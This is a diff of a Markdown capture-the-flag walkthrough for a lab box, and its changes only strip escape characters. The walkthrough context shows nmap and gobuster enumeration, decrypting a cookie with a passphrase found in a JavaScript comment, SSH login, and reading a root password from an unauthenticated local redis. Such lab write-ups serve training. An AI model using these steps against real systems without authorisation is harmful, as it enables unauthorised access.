@@ -1,4 +1,4 @@
-# ReconCipher - ThunderCipher
+**ReconCipher - ThunderCipher**
 
 
 
@@ -34,15 +34,15 @@ PORT   STATE SERVICE VERSION
 
 |   256 81:fd:c6:4c:5a:50:0a:27:ea:83:38:64:b9:8b:bd:c1 (ECDSA)
 
-|\_  256 c1:8f:87:c1:52:09:27:60:5f:2e:2d:e0:08:03:72:c8 (ED25519)
+|_  256 c1:8f:87:c1:52:09:27:60:5f:2e:2d:e0:08:03:72:c8 (ED25519)
 
 80/tcp open  http    Apache httpd 2.4.38 ((Debian))
 
-|\_http-server-header: Apache/2.4.38 (Debian)
+|_http-server-header: Apache/2.4.38 (Debian)
 
-|\_http-title: ReconCipher | Index 
+|_http-title: ReconCipher | Index 
 
-Service Info: OS: Linux; CPE: cpe:/o:linux:linux\_kernel
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 
 
@@ -76,23 +76,23 @@ gobuster dir -u http://192.168.5.250 -w /usr/share/wordlists/dirb/big.txt
 
 Gobuster v3.8.2
 
-by OJ Reeves (@TheColonial) \& Christian Mehlmauer (@firefart)
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 
 ===============================================================
 
-\[+] Url:                     http://192.168.5.250
+[+] Url:                     http://192.168.5.250
 
-\[+] Method:                  GET
+[+] Method:                  GET
 
-\[+] Threads:                 10
+[+] Threads:                 10
 
-\[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
+[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
 
-\[+] Negative Status codes:   404
+[+] Negative Status codes:   404
 
-\[+] User Agent:              gobuster/3.8.2
+[+] User Agent:              gobuster/3.8.2
 
-\[+] Timeout:                 10s
+[+] Timeout:                 10s
 
 ===============================================================
 
@@ -100,19 +100,19 @@ Starting gobuster in directory enumeration mode
 
 ===============================================================
 
-.htpasswd            (Status: 403) \[Size: 278]
+.htpasswd            (Status: 403) [Size: 278]
 
-.htaccess            (Status: 403) \[Size: 278]
+.htaccess            (Status: 403) [Size: 278]
 
-css                  (Status: 301) \[Size: 312] \[--> http://192.168.5.250/css/]
+css                  (Status: 301) [Size: 312] [--> http://192.168.5.250/css/]
 
-img                  (Status: 301) \[Size: 312] \[--> http://192.168.5.250/img/]
+img                  (Status: 301) [Size: 312] [--> http://192.168.5.250/img/]
 
-js                   (Status: 301) \[Size: 311] \[--> http://192.168.5.250/js/]
+js                   (Status: 301) [Size: 311] [--> http://192.168.5.250/js/]
 
-manual               (Status: 301) \[Size: 315] \[--> http://192.168.5.250/manual/]
+manual               (Status: 301) [Size: 315] [--> http://192.168.5.250/manual/]
 
-server-status        (Status: 403) \[Size: 278]
+server-status        (Status: 403) [Size: 278]
 
 Progress: 20469 / 20469 (100.00%)
 
@@ -146,13 +146,13 @@ function viewDetails(str) {
 
 
 
-&nbsp; window.location.href = "opus-details.php?id="+str;
+ window.location.href = "opus-details.php?id="+str;
 
 }
 
 
 
-/\*
+/*
 
 var CryptoJS = require("crypto-js");
 
@@ -160,7 +160,7 @@ var decrypted = CryptoJS.AES.decrypt(encrypted, "SecretPassphraseMomentum");
 
 console.log(decrypted.toString(CryptoJS.enc.Utf8));
 
-\*/
+*/
 
 ```
 
@@ -182,7 +182,7 @@ Then, at the local storage our cookie was a long string, after some research I f
 
 
 
-```encrypted\_string
+```encrypted_string
 
 U2Fs.....BSZt
 
@@ -192,7 +192,7 @@ U2Fs.....BSZt
 
 
 
-Since, we have a key and a encrypted\_Text, let's decrypt it and see what it has for us.
+Since, we have a key and a encrypted_Text, let's decrypt it and see what it has for us.
 
 
 
@@ -202,7 +202,7 @@ Since, we have a key and a encrypted\_Text, let's decrypt it and see what it has
 
 echo "U2Fs....BSZt" | openssl enc -d -aes-256-cbc -a -salt -pass pass:SecretPassphraseMomentum -md md5
 
-\*\*\* WARNING : deprecated key derivation used.
+*** WARNING : deprecated key derivation used.
 
 Using -iter or -pbkdf2 would be better.
 
@@ -228,11 +228,11 @@ I checked if it is a valid user, and yes, the user is a valid user and has passw
 
 ssh auxerre@192.168.5.250
 
-\*\* WARNING: connection is not using a post-quantum key exchange algorithm.
+** WARNING: connection is not using a post-quantum key exchange algorithm.
 
-\*\* This session may be vulnerable to "store now, decrypt later" attacks.
+** This session may be vulnerable to "store now, decrypt later" attacks.
 
-\*\* The server may need to be upgraded. See https://openssh.com/pq.html
+** The server may need to be upgraded. See https://openssh.com/pq.html
 
 auxerre@192.168.5.250's password: 
 
@@ -258,15 +258,15 @@ Since, the decrypted message had a ssh username and some text, I tried different
 
 ssh auxerre@192.168.5.250
 
-\*\* WARNING: connection is not using a post-quantum key exchange algorithm.
+** WARNING: connection is not using a post-quantum key exchange algorithm.
 
-\*\* This session may be vulnerable to "store now, decrypt later" attacks.
+** This session may be vulnerable to "store now, decrypt later" attacks.
 
-\*\* The server may need to be upgraded. See https://openssh.com/pq.html
+** The server may need to be upgraded. See https://openssh.com/pq.html
 
 auxerre@192.168.5.250's password: 
 
-Linux Momentum 4.19.0-16-amd64 #1 SMP Debian 4.19.181-1 (2021-03-19) x86\_64
+Linux Momentum 4.19.0-16-amd64 #1 SMP Debian 4.19.181-1 (2021-03-19) x86_64
 
 
 
@@ -274,7 +274,7 @@ The programs included with the Debian GNU/Linux system are free software;
 
 the exact distribution terms for each program are described in the
 
-individual files in /usr/share/doc/\*/copyright.
+individual files in /usr/share/doc/*/copyright.
 
 
 
@@ -322,17 +322,17 @@ auxerre@Momentum:~$ ss -tulnp
 
 Netid                      State                       Recv-Q                      Send-Q                                             Local Address:Port                                             Peer Address:Port                      
 
-udp                        UNCONN                      0                           0                                                        0.0.0.0:68                                                    0.0.0.0:\*                         
+udp                        UNCONN                      0                           0                                                        0.0.0.0:68                                                    0.0.0.0:*                         
 
-tcp                        LISTEN                      0                           128                                                      0.0.0.0:22                                                    0.0.0.0:\*                         
+tcp                        LISTEN                      0                           128                                                      0.0.0.0:22                                                    0.0.0.0:*                         
 
-tcp                        LISTEN                      0                           128                                                    127.0.0.1:6379                                                  0.0.0.0:\*                         
+tcp                        LISTEN                      0                           128                                                    127.0.0.1:6379                                                  0.0.0.0:*                         
 
-tcp                        LISTEN                      0                           128                                                         \[::]:22                                                       \[::]:\*                         
+tcp                        LISTEN                      0                           128                                                         [::]:22                                                       [::]:*                         
 
-tcp                        LISTEN                      0                           128                                                        \[::1]:6379                                                     \[::]:\*                         
+tcp                        LISTEN                      0                           128                                                        [::1]:6379                                                     [::]:*                         
 
-tcp                        LISTEN                      0                           128                                                            \*:80                                                          \*:\*  
+tcp                        LISTEN                      0                           128                                                            *:80                                                          *:*  
 
 ```
 
@@ -348,9 +348,9 @@ We got our root password from redis.
 
 auxerre@Momentum:~$ redis-cli
 
-127.0.0.1:6379> KEYS \*
+127.0.0.1:6379> KEYS *
 
-1\) "rootpass"
+1) "rootpass"
 
 127.0.0.1:6379> GET rootpass
 
@@ -393,4 +393,5 @@ root@Momentum:~# cat root.txt
 ThunderCipher{root....h}
 
 ```
+
 
